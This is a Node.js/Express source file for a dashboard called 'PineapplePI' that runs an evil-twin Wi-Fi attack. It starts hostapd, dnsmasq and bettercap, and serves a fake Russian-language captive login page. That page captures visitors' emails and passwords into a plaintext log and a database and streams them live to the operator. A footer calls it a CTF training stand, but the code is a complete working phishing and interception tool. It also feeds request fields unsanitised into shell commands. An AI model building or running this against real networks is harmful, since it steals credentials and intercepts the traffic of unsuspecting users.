/**
 * PineapplePI Web Dashboard - Node.js + Express
 * Real-time network map, client management, attack controls
 */
'use strict';

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { exec, spawn } = require('child_process');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = 8080;
const DB_PATH = '/opt/pineapple/db/pineapple.db';
const LOG_DIR = '/var/log/pineapple';

// State
const state = {
  hostapdPid: null,
  dnsmasqPid: null,
  bettercapPid: null,
  reconPid: null,
  attackActive: false,
};

// DB helper
function getDb() {
  return new sqlite3.Database(DB_PATH, sqlite3.OPEN_READONLY, (err) => {
    if (err) console.error('DB error:', err.message);
  });
}

function initDb() {
  const db = new sqlite3.Database(DB_PATH);
  db.run(`CREATE TABLE IF NOT EXISTS clients (
    id INTEGER PRIMARY KEY, ip TEXT UNIQUE, mac TEXT, hostname TEXT,
    vendor TEXT, os_guess TEXT, open_ports TEXT, cves TEXT,
    first_seen TEXT, last_seen TEXT, raw_nmap TEXT
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS traffic_log (
    id INTEGER PRIMARY KEY, ts TEXT, src_ip TEXT, dst_ip TEXT, proto TEXT, data TEXT
  )`);
  db.close();
}
initDb();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// API Routes
app.get('/api/clients', (req, res) => {
  const db = getDb();
  db.all('SELECT * FROM clients ORDER BY last_seen DESC', [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows.map(r => ({
      ...r,
      open_ports: tryParse(r.open_ports, []),
      cves: tryParse(r.cves, []),
    })));
    db.close();
  });
});

app.get('/api/traffic', (req, res) => {
  const db = getDb();
  const limit = parseInt(req.query.limit) || 100;
  db.all('SELECT * FROM traffic_log ORDER BY ts DESC LIMIT ?', [limit], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
    db.close();
  });
});

app.get('/api/status', (req, res) => {
  exec("iw dev 2>/dev/null | grep -E 'Interface|type'", (err, stdout) => {
    const ifaces = stdout || '';
    exec("cat /var/lib/misc/dnsmasq.leases 2>/dev/null | wc -l", (e2, clients) => {
      res.json({
        hostapd: state.hostapdPid !== null,
        dnsmasq: state.dnsmasqPid !== null,
        bettercap: state.bettercapPid !== null,
        recon: state.reconPid !== null,
        attackActive: state.attackActive,
        clientCount: parseInt(clients) || 0,
        interfaces: ifaces.trim(),
        uptime: process.uptime(),
      });
    });
  });
});

app.get('/api/logs', (req, res) => {
  const logFile = path.join(LOG_DIR, 'recon.log');
  exec(`tail -n 100 "${logFile}" 2>/dev/null`, (err, stdout) => {
    res.json({ logs: stdout || 'Нет логов' });
  });
});

// Attack control
app.post('/api/attack/start', (req, res) => {
  if (state.attackActive) return res.json({ ok: false, msg: 'Атака уже запущена' });

  const ssid = req.body.ssid || 'FreeWiFi';
  const iface = req.body.iface || 'wlan1';

  // Обновляем hostapd.conf с нужным SSID
  const hostapdConf = `/opt/pineapple/config/hostapd.conf`;
  exec(`sed -i 's/^ssid=.*/ssid=${ssid}/' "${hostapdConf}"`, () => {
    // Запускаем radio stack
    exec(`/opt/pineapple/scripts/pineapple-radio.sh start ${iface}`, (err) => {
      if (err) return res.json({ ok: false, msg: err.message });

      // hostapd
      const hostapd = spawn('hostapd', [hostapdConf], { detached: true });
      state.hostapdPid = hostapd.pid;

      // dnsmasq
      const dnsmasq = spawn('dnsmasq', [
        '-C', '/opt/pineapple/config/dnsmasq.conf',
        '--no-daemon'
      ], { detached: true });
      state.dnsmasqPid = dnsmasq.pid;

      // bettercap
      const bc = spawn('bettercap', [
        '-iface', iface,
        '-caplet', '/opt/pineapple/config/bettercap.cap',
        '-no-colors'
      ], { detached: true });
      state.bettercapPid = bc.pid;

      // recon
      const recon = spawn('python3', ['/opt/pineapple/scripts/recon.py'], { detached: true });
      state.reconPid = recon.pid;

      state.attackActive = true;
      io.emit('status', { event: 'attack_started', ssid, iface });
      res.json({ ok: true, msg: `Evil Twin запущен: SSID=${ssid}, iface=${iface}` });
    });
  });
});

app.post('/api/attack/stop', (req, res) => {
  const toKill = [state.hostapdPid, state.dnsmasqPid, state.bettercapPid, state.reconPid]
    .filter(Boolean);
  toKill.forEach(pid => {
    try { process.kill(pid, 'SIGTERM'); } catch (e) {}
  });
  exec('/opt/pineapple/scripts/pineapple-radio.sh stop');
  exec('pkill -f "hostapd|dnsmasq.*pineapple|bettercap|recon.py" 2>/dev/null');
  state.hostapdPid = state.dnsmasqPid = state.bettercapPid = state.reconPid = null;
  state.attackActive = false;
  io.emit('status', { event: 'attack_stopped' });
  res.json({ ok: true, msg: 'Атака остановлена' });
});

app.post('/api/attack/monitor', (req, res) => {
  const iface = req.body.iface || 'wlan1';
  exec(`ip link set ${iface} down && iw ${iface} set monitor control && ip link set ${iface} up`,
    (err, stdout, stderr) => {
      if (err) return res.json({ ok: false, msg: stderr });
      res.json({ ok: true, msg: `${iface} переведён в monitor mode` });
    });
});

// Captive portal
app.get('/hotspot-detect.html', (req, res) => { res.redirect('/portal'); });
app.get('/generate_204', (req, res) => { res.redirect('/portal'); });
app.get('/portal', (req, res) => {
  const clientIp = req.ip;
  const ua = req.headers['user-agent'] || '';
  const ts = new Date().toISOString();
  const logEntry = `${ts} PORTAL_HIT ip=${clientIp} ua=${ua.substring(0, 80)}\n`;
  fs.appendFile(path.join(LOG_DIR, 'portal.log'), logEntry, () => {});
  res.send(getPortalHtml());
});

// Realtime via socket.io
io.on('connection', (socket) => {
  console.log('Dashboard connected:', socket.id);
  socket.emit('status', { event: 'connected', state });

  // Push clients every 5s
  const interval = setInterval(() => {
    const db = getDb();
    db.all('SELECT ip, mac, vendor, os_guess, last_seen FROM clients ORDER BY last_seen DESC LIMIT 50',
      [], (err, rows) => {
        if (!err) socket.emit('clients', rows);
        db.close();
      });
  }, 5000);

  socket.on('disconnect', () => clearInterval(interval));
});

// Captive portal HTML
function getPortalHtml() {
  return `<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Авторизация</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { background:#1a1a2e; color:#eee; font-family:'Segoe UI',sans-serif;
         display:flex; align-items:center; justify-content:center; min-height:100vh; }
  .card { background:#16213e; border:1px solid #0f3460; border-radius:12px;
          padding:40px; width:380px; box-shadow:0 20px 60px rgba(0,0,0,0.5); }
  .logo { text-align:center; font-size:2rem; margin-bottom:8px; }
  h2 { text-align:center; color:#e94560; margin-bottom:6px; }
  .sub { text-align:center; color:#888; font-size:0.9rem; margin-bottom:28px; }
  input { width:100%; padding:12px 16px; background:#0f3460; border:1px solid #e94560;
          border-radius:8px; color:#fff; font-size:1rem; margin-bottom:16px; outline:none; }
  input:focus { border-color:#e9c46a; box-shadow:0 0 0 2px rgba(233,196,106,0.2); }
  button { width:100%; padding:14px; background:linear-gradient(135deg,#e94560,#0f3460);
           border:none; border-radius:8px; color:#fff; font-size:1.1rem;
           cursor:pointer; transition:opacity .2s; }
  button:hover { opacity:0.85; }
  .terms { text-align:center; color:#666; font-size:0.75rem; margin-top:16px; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">📶</div>
  <h2>Вход в сеть</h2>
  <p class="sub">Введите данные для подключения к интернету</p>
  <form onsubmit="login(event)">
    <input type="email" id="email" placeholder="Email или логин" required>
    <input type="password" id="pass" placeholder="Пароль" required>
    <button type="submit">Подключиться</button>
  </form>
  <p class="terms">Используя сеть, вы соглашаетесь с условиями использования.<br>
  <em>Учебный стенд CTF / PineapplePI</em></p>
</div>
<script>
function login(e) {
  e.preventDefault();
  const data = { email: document.getElementById('email').value, pass: document.getElementById('pass').value };
  fetch('/api/portal_cred', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) });
  document.querySelector('.card').innerHTML = '<div style="text-align:center;padding:40px"><div style="font-size:3rem">✅</div><h2 style="color:#4ade80;margin-top:16px">Подключено!</h2><p style="color:#888;margin-top:8px">Перенаправление...</p></div>';
  setTimeout(() => location.href = 'http://example.com', 2000);
}
</script>
</body>
</html>`;
}

// Capture portal credentials
app.post('/api/portal_cred', (req, res) => {
  const { email, pass } = req.body;
  const clientIp = req.ip;
  const ts = new Date().toISOString();
  const logEntry = `${ts} CRED_CAPTURE ip=${clientIp} email=${email} pass=${pass}\n`;
  fs.appendFile(path.join(LOG_DIR, 'credentials.log'), logEntry, () => {});

  // Save to DB
  const db = new sqlite3.Database(DB_PATH);
  db.run(`CREATE TABLE IF NOT EXISTS credentials (
    id INTEGER PRIMARY KEY, ts TEXT, ip TEXT, email TEXT, password TEXT
  )`);
  db.run('INSERT INTO credentials (ts,ip,email,password) VALUES (?,?,?,?)',
    [ts, clientIp, email, pass]);
  db.close();

  io.emit('credential', { ts, ip: clientIp, email });
  res.json({ ok: true });
});

app.get('/api/credentials', (req, res) => {
  const db = getDb();
  db.all('SELECT ts,ip,email FROM credentials ORDER BY ts DESC LIMIT 50', [], (err, rows) => {
    if (err) return res.json([]);
    res.json(rows);
    db.close();
  });
});

function tryParse(str, def) {
  try { return JSON.parse(str); } catch { return def; }
}

server.listen(PORT, '0.0.0.0', () => {
  console.log(`PineapplePI Dashboard running on http://0.0.0.0:${PORT}`);
});
